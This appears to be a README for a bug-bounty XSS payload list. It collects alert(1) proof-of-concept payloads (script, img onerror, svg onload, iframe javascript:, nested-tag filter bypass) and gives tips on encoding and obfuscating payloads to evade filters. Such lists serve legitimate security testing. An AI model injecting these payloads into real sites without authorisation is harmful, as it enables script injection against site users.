# 🔥 Ultimate XSS Payload List (2026)

A complete collection of Cross-Site Scripting (XSS) payloads, including basic, advanced, and filter bypass techniques used in real-world bug bounty hunting.

---

## 🚀 What is XSS?

Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject malicious scripts into web applications.

---

## ⚡ Basic XSS Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

🔥 Advanced Payloads
"><script>alert(1)</script>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>

🧠 Filter Bypass Payloads
<scr<script>ipt>alert(1)</scr<script>ipt>
<svg><script>alert(1)</script>
"><img src=x onerror=alert(1)>

🎯 Real-World Tips
Test different input fields
Try encoding payloads
Bypass filters using obfuscation

📚 Complete XSS Guide

For a full step-by-step tutorial with real examples and exploitation techniques:

👉 https://securityelites.com/xss-cross-site-scripting-tutorial/

🔗 More Cybersecurity Resources
https://securityelites.com


⭐ Contribute

Feel free to submit new payloads or bypass techniques via pull requests.

⚠️ Disclaimer

This repository is for educational purposes only. Use responsibly.
